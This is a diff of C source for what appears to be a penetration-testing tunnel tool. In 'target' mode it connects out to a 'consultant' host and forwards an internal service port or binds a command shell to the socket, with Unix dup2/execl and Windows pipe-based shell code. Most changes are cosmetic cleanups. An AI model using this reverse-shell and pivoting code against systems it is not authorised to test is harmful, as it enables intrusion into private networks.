@@ -51,7 +51,7 @@
 #define BUF_SIZE 1024
 #define DOEXEC_BUFFER_SIZE 200 /* twiddle for windows doexec stuff. ctrl-f for "nc111nt.zip" */
 
-int getopt(int argc, char * const argv[], const char *optstring);
+int getopt(int argc, char* const argv[], const char *optstring);
 
 int do_consultant(int tunnelPort, const int servicePort);
 int do_target(const char *consultantHost, const char *targetHost, int tunnelPort, const int servicePort);
@@ -86,8 +86,8 @@ const char *usageString2 = "In target mode:\n\n" \
             "  -s <port>       Create a tunnel to <target>:<port> inside the target network\n\n";
 
 void usage() {
-    puts(usageString1);
-    puts(usageString2);
+    puts(usageString1); /* broke it in half for strings under 509 */
+    puts(usageString2); /* portability consultant-side? sure why not */
 }
 
 #ifdef __WIN32__
@@ -97,7 +97,7 @@ void usage() {
 #endif
 
 int main(int argc, char **argv) {
-    int opt, retVal;
+    int opt;
     char consultantHost[BUF_SIZE];
     char targetHost[BUF_SIZE];
     int tunnelPort = 0, servicePort = 0, mode = 0xff;
@@ -145,27 +145,22 @@ int main(int argc, char **argv) {
     WSAStartup( wVersionRequested, &wsaData );
 #endif
 
-    /* In consultant */
     if (mode == CONSULTANT_MODE) {
         if (!tunnelPort || !servicePort) {
             usage();
             return 1;
         }
-        retVal = do_consultant(tunnelPort, servicePort);
+        return do_consultant(tunnelPort, servicePort);
     }
     else if (mode == TARGET_MODE) {
         if (!(tunnelPort && (servicePort || cmdshell)) || !consultantHost[0] || (servicePort && cmdshell)) {
             usage();
             return 1;
         }
-        retVal = do_target(consultantHost, targetHost, tunnelPort, servicePort);
+        return do_target(consultantHost, targetHost, tunnelPort, servicePort);
     }
-    else {
-        usage();
-        return 1;
-    }
-
-    return retVal;
+    usage();
+    return 1;
 }
 
 /****************************
@@ -186,7 +181,7 @@ int do_consultant(int tunnelPort, const int servicePort) {
         return 1;
     
     i = sizeof(targetAddr);
-    printf("Consultant: Waiting for the remote target to establish the tunnel on port %d\n",tunnelPort);
+    printf("Consultant: Waiting for the remote target to establish the tunnel on port %d\n", tunnelPort);
     
     if ((targetSock = accept(tunnelSock, (struct sockaddr *)&targetAddr, &i)) == -1) {
         perror("ERROR: accept()");
@@ -228,7 +223,7 @@ int do_consultant(int tunnelPort, const int servicePort) {
         perror("ERROR: send()");
         return 1;
     }
-    printf("Consultant: W00t! You are connected. Shoveling data... press CTRL-C to abort\n");
+    printf("Consultant: You are connected. Passing data... press CTRL-C to abort\n");
 
     /* shovel data between the client and the target */
     return shovel_data(targetSock, clientSock);
@@ -286,7 +281,7 @@ int do_target(const char *consultantHost, const char *targetHost, int tunnelPort
         return 1;
     
     printf("Target: Connected to service port %s:%d\n", targetHost, servicePort);
-    printf("Target: Shoveling data across the tunnel...\n");
+    printf("Target: Passing data across the tunnel...\n");
 
     /* shovel data between the client and the target */
     return shovel_data(tunnelSock, serviceSock);	
@@ -309,7 +304,7 @@ void doexec(int sock) {
     dup2(0, 2);
     if ((p = strrchr(cmdshell, '/')))
         p++;
-        execl(cmdshell, p, (char *)NULL);
+        execl(cmdshell, p, NULL);
     }
 #endif
 
@@ -411,7 +406,6 @@ int shovel_data(const int fd1, const int fd2) {
         if (buf2_written == buf2_avail)
             buf2_written = buf2_avail = 0;
     }
-
     return 0;
 }
 
@@ -421,8 +415,7 @@ int shovel_data(const int fd1, const int fd2) {
  * Sets up a socket, bind()s it to all interfaces, then listen()s on it.
  * Returns a valid socket, or -1 on failure
  */
-int listen_socket(int listen_port)
-{
+int listen_socket(int listen_port) {
     struct sockaddr_in a;
     int s;
     int yes = 1;
@@ -500,6 +493,7 @@ int connect_socket(const int connect_port, const char *address) {
 
 /* this deals with windows' broken dup() system. 
 * all this for a little dup2, dup2, exec? dang.
+* note that the REST OF THE FILE is in this ifdef
 */
 #ifdef __WIN32__ 
 
@@ -564,7 +558,7 @@ static PSESSION_DATA CreateSession() {
 
     /* Allocate space for the session data */
     Session = (PSESSION_DATA) malloc(sizeof(SESSION_DATA));
-    if (Session == NULL) {
+    if (!Session) {
         return NULL;
     }
 
@@ -615,7 +609,7 @@ static PSESSION_DATA CreateSession() {
     Session->ClientSocket = INVALID_SOCKET;
 
     /* Success, return the session pointer as a handle */
-    return(Session);
+    return Session;
 
 Failure: /* WHO TOLD US WE COULD USE GOTOS */
 
@@ -633,7 +627,7 @@ Failure: /* WHO TOLD US WE COULD USE GOTOS */
 
     free(Session);
 
-    return(NULL);
+    return NULL;
 }
 
 BOOL doexec(SOCKET  ClientSocket) {
@@ -671,7 +665,7 @@ BOOL doexec(SOCKET  ClientSocket) {
             (LPTHREAD_START_ROUTINE) SessionWriteShellThreadFn, 
             (LPVOID) Session, 0, &ThreadId);
 
-    if (Session->WriteShellThreadHandle == NULL) {
+    if (!Session->WriteShellThreadHandle) {
         holler("Failed to create ReadShell session thread, error = %s", 
                 itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);
 
@@ -689,16 +683,16 @@ BOOL doexec(SOCKET  ClientSocket) {
 
     i = WaitForMultipleObjects(3, HandleArray, FALSE, 0xffffffff);
 
-    switch (i) {
-        case WAIT_OBJECT_0 + 0:
+    switch (i - WAIT_OBJECT_0) {
+        case 0:
             TerminateThread(Session->WriteShellThreadHandle, 0);
             TerminateProcess(Session->ProcessHandle, 1);
             break;
-        case WAIT_OBJECT_0 + 1:
+        case 1:
             TerminateThread(Session->ReadShellThreadHandle, 0);
             TerminateProcess(Session->ProcessHandle, 1);
             break;
-        case WAIT_OBJECT_0 + 2:
+        case 2:
             TerminateThread(Session->WriteShellThreadHandle, 0);
             TerminateThread(Session->ReadShellThreadHandle, 0);
             break;
@@ -770,7 +764,7 @@ static HANDLE StartShell(HANDLE ShellStdinPipeHandle, HANDLE ShellStdoutPipeHand
         holler("Failed to execute shell, error = %s", 
                 itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);
 
-    return(ProcessHandle);
+    return ProcessHandle;
 }
 
 
@@ -813,7 +807,7 @@ static VOID SessionReadShellThreadFn(LPVOID Parameter) {
     }
 
     if (GetLastError() != ERROR_BROKEN_PIPE)
-        holler("SessionReadShellThreadFn exitted, error = %s", 
+        holler("SessionReadShellThreadFn exited, error = %s", 
                 itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);
 
     ExitThread(0);
@@ -831,9 +825,7 @@ static VOID SessionWriteShellThreadFn(LPVOID Parameter) {
     BYTE    RecvBuffer[1];
     BYTE    Buffer[DOEXEC_BUFFER_SIZE];
     DWORD   BytesWritten;
-    DWORD   BufferCnt;
-
-    BufferCnt = 0;
+    DWORD   BufferCnt = 0;
 
     /* Loop, reading one byte at a time from the socket. */
     while (recv(Session->ClientSocket, RecvBuffer, sizeof(RecvBuffer), 0) != 0) {
@@ -867,14 +859,14 @@ static VOID SessionWriteShellThreadFn(LPVOID Parameter) {
  * machines have vfprintf/vsyslog/whatever!  6 params oughta be enough.
  * */
 void holler (char *str, char *p1, char *p2, char *p3, char *p4, char *p5, char *p6) {
-    fprintf (stderr, str, p1, p2, p3, p4, p5, p6);
+    fprintf(stderr, str, p1, p2, p3, p4, p5, p6);
 
 #ifdef WIN32
     if (h_errno)
-        fprintf (stderr, ": %s\n",winsockstr(h_errno));
+        fprintf(stderr, ": %s\n", winsockstr(h_errno));
 #else
     if (errno) {		/* this gives funny-looking messages, but */
-        perror (" ");		/* it's more portable than sys_errlist[]... */
+        perror(" ");		/* it's more portable than sys_errlist[]... */
     }				/* xxx: do something better.  */
     /* yyy: did something worse. */
     /* zzz: what is this shit */
